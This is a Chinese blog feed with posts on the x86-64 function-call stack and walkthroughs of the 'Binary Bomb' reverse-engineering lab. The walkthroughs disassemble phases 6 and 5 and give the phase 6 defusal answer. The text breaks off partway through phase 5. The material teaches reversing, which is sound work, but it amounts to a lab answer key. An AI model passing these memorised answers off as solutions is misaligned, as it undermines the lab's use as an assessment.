class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a+b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = sum(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"result is:%d\n"</span>, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>编译为汇编代码之后，为了方便读代码，去除一些不需要的指示段之后得到如下代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">    .file</span>   <span class="string">"main.c"</span></span><br><span class="line"><span class="meta">    .text</span></span><br><span class="line"><span class="meta">    .globl</span>  sum</span><br><span class="line"><span class="meta">    .type</span>   sum, @function</span><br><span class="line"><span class="symbol">sum:</span></span><br><span class="line"><span class="symbol">.LFB0:</span></span><br><span class="line">    pushq   %rbp</span><br><span class="line">    <span class="keyword">movq</span>    %rsp, %rbp</span><br><span class="line">    movl    %edi, -<span class="number">4</span>(%rbp)</span><br><span class="line">    movl    %esi, -<span class="number">8</span>(%rbp)</span><br><span class="line">    movl    -<span class="number">4</span>(%rbp), %edx</span><br><span class="line">    movl    -<span class="number">8</span>(%rbp), %eax</span><br><span class="line">    addl    %edx, %eax</span><br><span class="line">    popq    %rbp</span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">.LFE0:</span></span><br><span class="line"><span class="meta">    .size</span>   sum, .-sum</span><br><span class="line"><span class="meta">    .section</span>    .rodata</span><br><span class="line"><span class="symbol">.LC0:</span></span><br><span class="line"><span class="meta">    .string</span> <span class="string">"result is:%d\n"</span></span><br><span class="line"><span class="meta">    .text</span></span><br><span class="line"><span class="meta">    .globl</span>  main</span><br><span class="line"><span class="meta">    .type</span>   main, @function</span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line"><span class="symbol">.LFB1:</span></span><br><span class="line">    pushq   %rbp</span><br><span class="line">    <span class="keyword">movq</span>    %rsp, %rbp</span><br><span class="line">    subq    <span class="number">$16</span>, %rsp</span><br><span class="line">    movl    <span class="number">$2</span>, %esi</span><br><span class="line">    movl    <span class="number">$1</span>, %edi</span><br><span class="line">    <span class="keyword">call</span>    sum</span><br><span class="line">    movl    %eax, -<span class="number">4</span>(%rbp)</span><br><span class="line">    movl    -<span class="number">4</span>(%rbp), %eax</span><br><span class="line">    movl    %eax, %esi</span><br><span class="line">    movl    $.LC0, %edi</span><br><span class="line">    movl    <span class="number">$0</span>, %eax</span><br><span class="line">    <span class="keyword">call</span>    printf</span><br><span class="line">    movl    <span class="number">$0</span>, %eax</span><br><span class="line">    <span class="keyword">leave</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"><span class="symbol">.LFE1:</span></span><br><span class="line"><span class="meta">    .size</span>   main, .-main</span><br><span class="line"><span class="meta">    .ident</span>  <span class="string">"GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609"</span></span><br><span class="line"><span class="meta">    .section</span>    .note.GNU-stack,<span class="string">""</span>,@progbits</span><br></pre></td></tr></table></figure><p>main函数其实也是被调用的函数(linux系统中main函数是由glibc中的 <a href="http://man7.org/linux/man-pages/man3/exec.3.html" target="_blank" rel="noopener">exec()簇</a> 函数调用)。<br>从main函数的第一条指令开始分析：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main:</span></span><br><span class="line"><span class="symbol">.LFB1:</span></span><br><span class="line">    pushq   %rbp</span><br><span class="line">    <span class="keyword">movq</span>    %rsp, %rbp</span><br></pre></td></tr></table></figure><p>首先，将当前的栈基址指针%rbp入栈，函数调用结束后我们就可以从栈中取得函数调用前%rbp指向的位置，进而恢复栈到之前的样子。然后使当前栈指针指向新的位置。然后：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subq    <span class="number">$16</span>, %rsp</span><br><span class="line">movl    <span class="number">$2</span>, %esi</span><br><span class="line">movl    <span class="number">$1</span>, %edi</span><br></pre></td></tr></table></figure><p>在栈上申请16字节的空间以便存放后面的临时变量x，然后根据System V ABI的调用约定将传递给sum函数的参数放入%esi和%edi中(因为是int类型占用4个字节，所以只需要用寄存器的低4字节即可)。这里你可能会发现编译器没有将需要调用者保存的%r10和%r11入栈，因为编译器知道在main函数中不会使用到%r10和%r11寄存器所以无需保存。然后发出调用指令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">call</span>    sum</span><br></pre></td></tr></table></figure><p>需要注意以上的CALL指令等同于：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUSHQ %rip</span><br><span class="line"><span class="keyword">JMP</span> sum</span><br></pre></td></tr></table></figure><p>我们把%rip当前的内容放入栈中，以便函数sum调用结束我们可以知道接下来该执行哪条指令，我们假设栈从0xC0000000处开始向低处延伸。到这个阶段栈的变化过程如下所示：<br><center><img src="https://i.loli.net/2020/04/03/YELFfnou5KCcTrB.png"></center><br>现在程序跳转到sum处执行计算：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pushq   %rbp</span><br><span class="line"><span class="keyword">movq</span>    %rsp, %rbp</span><br><span class="line">movl    %edi, -<span class="number">4</span>(%rbp)</span><br><span class="line">movl    %esi, -<span class="number">8</span>(%rbp)</span><br><span class="line">movl    -<span class="number">4</span>(%rbp), %edx</span><br><span class="line">movl    -<span class="number">8</span>(%rbp), %eax</span><br><span class="line">addl    %edx, %eax</span><br></pre></td></tr></table></figure><p>和main函数被调用一样，sum函数被调用时，首先也是保存%rbp，然后更新栈指针%rsp，将两个参数拷贝到栈中进行使用。在这里你可能看到了和main 函数不一样的地方，局部变量保存在栈中并没有像main函数中那样引起%rsp的移动(对比main函数中的SUBQ 16)。是因为编译器知道sum中不会再调用其它函数，也就不用保存数据到栈中了，直接使用栈空间即可。所以就无需位移%rsp。计算完成后结果保存在%eax中，现在我们更新一下栈的变化：<br><center><img src="https://i.loli.net/2020/04/03/PGg5kCdnxmoYUKA.png"><br></center><br>然后返回到main函数时执行了如下操作：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq    %rbp</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>先恢复调用前的栈基址指针%rbp，然后此时栈顶的元素就是函数调用之后需要执行的下一条指令的地址，RET指令等价于：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popq    %rip</span><br></pre></td></tr></table></figure><p>这样就可以跳转到函数结束后的下一条指令 “movl %eax, -4(%rbp)”处继续执行,至此我们看一下完整调用过程中栈的变化：<br><center><img src="https://i.loli.net/2020/04/03/fWxqvp8Pe3i2ZL9.png"><br></center></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;A survey of myvm &amp;amp; disassembler &amp;amp; more.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Disassemble" scheme="https://purewhitywhite.github.io/tags/Disassemble/"/>
    
  </entry>
  
  <entry>
    <title>Binary Bomb Phase6</title>
    <link href="https://purewhitywhite.github.io/2020-03-25/Binary-Bomb-Phase6/"/>
    <id>https://purewhitywhite.github.io/2020-03-25/Binary-Bomb-Phase6/</id>
    <published>2020-03-24T16:27:04.000Z</published>
    <updated>2020-04-03T16:05:48.707Z</updated>
    
    <content type="html"><![CDATA[<p>Binary Bomb Phase6 writeup.</p><a id="more"></a><h1 id="Binary-Bomb-Phase6"><a href="#Binary-Bomb-Phase6" class="headerlink" title="Binary Bomb Phase6"></a>Binary Bomb Phase6</h1><h2 id="输入数字检验"><a href="#输入数字检验" class="headerlink" title="输入数字检验"></a>输入数字检验</h2><p>本部分是一个双层循环，分为两部分：检验输入数字是否都不大于6&amp;&amp;是否互不相等</p><h3 id="是否不大于6"><a href="#是否不大于6" class="headerlink" title="是否不大于6"></a>是否不大于6</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048DCD                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>08048DD2                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="built_in">esi</span>*<span class="number">4</span>+<span class="number">4Ch</span>+var_3C]</span><br><span class="line"><span class="symbol">.text:</span>08048DD6                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">1</span>          <span class="comment">; Integer Subtraction</span></span><br><span class="line"><span class="symbol">.text:</span>08048DD9                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">5</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048DDC                 <span class="keyword">jbe</span>     short loc_8048DE3 <span class="comment">; Jump if Below or Equal (CF=1 | ZF=1)</span></span><br><span class="line"><span class="symbol">.text:</span>08048DDE                 <span class="keyword">call</span>    explode_bomb    <span class="comment">; Call Procedure</span></span><br></pre></td></tr></table></figure><p>这部分通过<code>esi</code>检验了每个数字是否不大于6，满足条件跳转到下面：</p><h3 id="是否互不相等"><a href="#是否互不相等" class="headerlink" title="是否互不相等"></a>是否互不相等</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048DE3                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">1</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048DE6                 <span class="keyword">cmp</span>     <span class="built_in">esi</span>, <span class="number">6</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048DE9                 <span class="keyword">jnz</span>     short loc_8048DF2 <span class="comment">; Jump if Not Zero (ZF=0)</span></span><br><span class="line">……</span><br><span class="line"><span class="symbol">.text:</span>08048DF2                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08048DF4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="built_in">ebx</span>*<span class="number">4</span>+<span class="number">4Ch</span>+var_3C]</span><br><span class="line"><span class="symbol">.text:</span>08048DF8                 <span class="keyword">cmp</span>     [<span class="built_in">esp</span>+<span class="built_in">esi</span>*<span class="number">4</span>+<span class="number">4Ch</span>+var_40], <span class="built_in">eax</span> <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048DFC                 <span class="keyword">jnz</span>     short loc_8048E03 <span class="comment">; Jump if Not Zero (ZF=0)</span></span><br><span class="line"><span class="symbol">.text:</span>08048DFE                 <span class="keyword">call</span>    explode_bomb    <span class="comment">; Call Procedure</span></span><br><span class="line"><span class="symbol">.text:</span>08048E03                 <span class="keyword">add</span>     <span class="built_in">ebx</span>, <span class="number">1</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048E06                 <span class="keyword">cmp</span>     <span class="built_in">ebx</span>, <span class="number">5</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048E09                 <span class="keyword">jle</span>     short loc_8048DF4 <span class="comment">; Jump if Less or Equal (ZF=1 | SF!=OF)</span></span><br><span class="line"><span class="symbol">.text:</span>08048E0B                 <span class="keyword">jmp</span>     short loc_8048DD2 <span class="comment">; Jump</span></span><br></pre></td></tr></table></figure><p>这部分是双重循环的内层循环，作用为检验当前数字是否与其后剩下的（6-ebx）个数字互不相同。</p><h2 id="按输入数字的顺序排列node"><a href="#按输入数字的顺序排列node" class="headerlink" title="按输入数字的顺序排列node"></a>按输入数字的顺序排列node</h2><p>大致思想是按照输入的数字序列的顺序存储node的地址</p><h3 id="当前数字为1"><a href="#当前数字为1" class="headerlink" title="当前数字为1"></a>当前数字为1</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048DEB                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>08048DF0                 <span class="keyword">jmp</span>     short loc_8048E2A <span class="comment">; Jump</span></span><br><span class="line">……</span><br><span class="line"><span class="symbol">.text:</span>08048E2A                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E2C                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">esp</span>+<span class="built_in">ebx</span>*<span class="number">4</span>+<span class="number">4Ch</span>+var_3C] <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>08048E30                 <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">1</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048E33                 <span class="keyword">jle</span>     short loc_8048E19 <span class="comment">; Jump if Less or Equal (ZF=1 | SF!=OF)</span></span><br><span class="line">// 判断当前读到数字是不是<span class="number">1</span>，是<span class="number">1</span>：</span><br><span class="line"><span class="symbol">.text:</span>08048E19                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, offset node1</span><br><span class="line"><span class="symbol">.text:</span>08048E1E                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="built_in">esi</span>*<span class="number">4</span>+<span class="number">4Ch</span>+var_24], <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E22                 <span class="keyword">add</span>     <span class="built_in">ebx</span>, <span class="number">1</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048E25                 <span class="keyword">cmp</span>     <span class="built_in">ebx</span>, <span class="number">6</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line">// <span class="number">6</span>个node都已经排好，跳出循环</span><br><span class="line"><span class="symbol">.text:</span>08048E28                 <span class="keyword">jz</span>      short loc_8048E41 <span class="comment">; Jump if Zero (ZF=1)</span></span><br></pre></td></tr></table></figure><p>当前数字为1，那么就将node1的地址放在当前<code>[esp+esi*4+4Ch+var_24]</code>所表示的地方</p><h3 id="当前数字不为1"><a href="#当前数字不为1" class="headerlink" title="当前数字不为1"></a>当前数字不为1</h3><p>先看看node的结构：<br><center><img src="https://i.loli.net/2020/04/03/kjQZ7dFybmN3uAo.png"></center><br>大致体现为一个单向链表的形式，存放着每个node的序号、指向的下一个节点的地址和一个数字。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048E35                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>08048E3A                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, offset node1</span><br><span class="line"><span class="symbol">.text:</span>08048E3F                 <span class="keyword">jmp</span>     short loc_8048E0D <span class="comment">; Jump</span></span><br><span class="line">……</span><br><span class="line"><span class="symbol">.text:</span>08048E0D                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">8</span>]  </span><br><span class="line"><span class="symbol">.text:</span>08048E10                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">1</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048E13                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>        <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048E15                 <span class="keyword">jnz</span>     short loc_8048E0D <span class="comment">; Jump if Not Zero (ZF=0)</span></span><br><span class="line"><span class="symbol">.text:</span>08048E17                 <span class="keyword">jmp</span>     short loc_8048E1E <span class="comment">; Jump</span></span><br><span class="line"><span class="symbol">.text:</span>08048E1E                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="built_in">esi</span>*<span class="number">4</span>+<span class="number">4Ch</span>+var_24], <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E22                 <span class="keyword">add</span>     <span class="built_in">ebx</span>, <span class="number">1</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048E25                 <span class="keyword">cmp</span>     <span class="built_in">ebx</span>, <span class="number">6</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line">// <span class="number">6</span>个node都已经排好，跳出循环</span><br><span class="line"><span class="symbol">.text:</span>08048E28                 <span class="keyword">jz</span>      short loc_8048E41 <span class="comment">; Jump if Zero (ZF=1)</span></span><br></pre></td></tr></table></figure><p>本部分是双重循环的内循环，大致思想为<strong>找到当前数字对应的node，将这个node的地址按照当前数字在数列中的位次放在<code>[esp+esi*4+4Ch+var_24]</code>处</strong>。查看效果：<br><center><img src="https://i.loli.net/2020/04/03/KCwD3NfRYOsBGVH.png"></center><br>每个node+8的位置存放着下个node的位置，所以使用<code>mov     edx, [edx+8]</code>进行node切换。</p><h2 id="修改node指向"><a href="#修改node指向" class="headerlink" title="修改node指向"></a>修改node指向</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048E41                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">esp</span>+<span class="number">4Ch</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span>08048E45                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">4Ch</span>+var_20] <span class="comment">; Load Effective Address</span></span><br><span class="line"><span class="symbol">.text:</span>08048E49                 <span class="keyword">lea</span>     <span class="built_in">esi</span>, [<span class="built_in">esp</span>+<span class="number">4Ch</span>+var_C] <span class="comment">; Load Effective Address</span></span><br><span class="line"><span class="symbol">.text:</span>08048E4D                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E4F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">.text:</span>08048E51                 <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">8</span>], <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E54                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">4</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048E57                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>        <span class="comment">; Compare Two Operands</span></span><br><span class="line">// 跳出循环</span><br><span class="line"><span class="symbol">.text:</span>08048E59                 <span class="keyword">jz</span>      short loc_8048E5F <span class="comment">; Jump if Zero (ZF=1)</span></span><br><span class="line"><span class="symbol">.text:</span>08048E5B                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E5D                 <span class="keyword">jmp</span>     short loc_8048E4F <span class="comment">; Jump</span></span><br></pre></td></tr></table></figure><p>这一部分中按照输入的数字的顺序将对应的每个node指向的下一个node的地址改为按照数字的顺序，而不是按node1→node2→node3……这样的顺序指向下一个node。查看修改后的效果（与第一张图片比较）：<br><center><img src="https://i.loli.net/2020/04/03/CqYZPN63ecdi4rX.png"></center></p><h2 id="判断是否从小到大"><a href="#判断是否从小到大" class="headerlink" title="判断是否从小到大"></a>判断是否从小到大</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048E5F                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>+<span class="number">8</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>08048E66                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>08048E6B                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>08048E6E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">.text:</span>08048E70                 <span class="keyword">cmp</span>     [<span class="built_in">ebx</span>], <span class="built_in">eax</span>      <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048E72                 <span class="keyword">jle</span>     short loc_8048E79 <span class="comment">; Jump if Less or Equal (ZF=1 | SF!=OF)</span></span><br><span class="line"><span class="symbol">.text:</span>08048E74                 <span class="keyword">call</span>    explode_bomb    <span class="comment">; Call Procedure</span></span><br><span class="line"><span class="symbol">.text:</span>08048E79                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebx</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>08048E7C                 <span class="keyword">sub</span>     <span class="built_in">esi</span>, <span class="number">1</span>          <span class="comment">; Integer Subtraction</span></span><br><span class="line"><span class="symbol">.text:</span>08048E7F                 <span class="keyword">jnz</span>     short loc_8048E6B <span class="comment">; Jump if Not Zero (ZF=0)</span></span><br><span class="line"><span class="symbol">.text:</span>08048E84                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048E85                 <span class="keyword">pop</span>     <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08048E86                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure><p>在这一部分将每个node存储的第一个数字与该node指向的下一个node存储的第一个数字进行比较，整体上看是判断每个node是否按照其存储的第一个数字以从小到大的顺序进行链接，若满足该条件即可正常返回。<br>注意到每个node存储的第一个数字为：0xd5 0x6c 0x10c 0x392 0xf4 0x307，即可确定输入的序列：<strong><code>2 1 5 3 6 4</code></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binary Bomb Phase6 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Binary Bomb Phase5</title>
    <link href="https://purewhitywhite.github.io/2020-03-24/Binary-Bomb-Phase5/"/>
    <id>https://purewhitywhite.github.io/2020-03-24/Binary-Bomb-Phase5/</id>
    <published>2020-03-24T08:31:11.000Z</published>
    <updated>2020-03-24T16:27:37.615Z</updated>
    
    <content type="html"><![CDATA[<p>Binary Bomb Phase5 writeup.</p><a id="more"></a><h1 id="Binary-Bomb-Phase5"><a href="#Binary-Bomb-Phase5" class="headerlink" title="Binary Bomb Phase5"></a>Binary Bomb Phase5</h1><h2 id="获取字符串部分"><a href="#获取字符串部分" class="headerlink" title="获取字符串部分"></a>获取字符串部分</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048D6F                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">esp</span>+<span class="number">1Ch</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>08048D73                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">1Ch</span>+var_1C], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048D76                 <span class="keyword">call</span>    string_length   <span class="comment">; Call Procedure</span></span><br><span class="line"><span class="symbol">.text:</span>08048D7B                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">6</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048D7E                 <span class="keyword">jz</span>      short loc_8048D85 <span class="comment">; Jump if Zero (ZF=1)</span></span><br><span class="line"><span class="symbol">.text:</span>08048D80                 <span class="keyword">call</span>    explode_bomb    <span class="comment">; Call Procedure</span></span><br></pre></td></tr></table></figure><p>这部分的目的是验证输入的字符串长度是否为6，不为6则会爆炸。</p><h2 id="逐字符判断"><a href="#逐字符判断" class="headerlink" title="逐字符判断"></a>逐字符判断</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048D85                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>08048D8A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>08048D8F                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="built_in">eax</span>] <span class="comment">; Move with Zero-Extend</span></span><br><span class="line"><span class="symbol">.text:</span>08048D93                 <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0Fh</span>        <span class="comment">; Logical AND</span></span><br><span class="line"><span class="symbol">.text:</span>08048D96                 <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">ds</span>:array_3141[<span class="built_in">ecx</span>*<span class="number">4</span>] <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048D9D                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">1</span>          <span class="comment">; Add</span></span><br><span class="line"><span class="symbol">.text:</span>08048DA0                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">6</span>          <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048DA3                 <span class="keyword">jnz</span>     short loc_8048D8F <span class="comment">; Jump if Not Zero 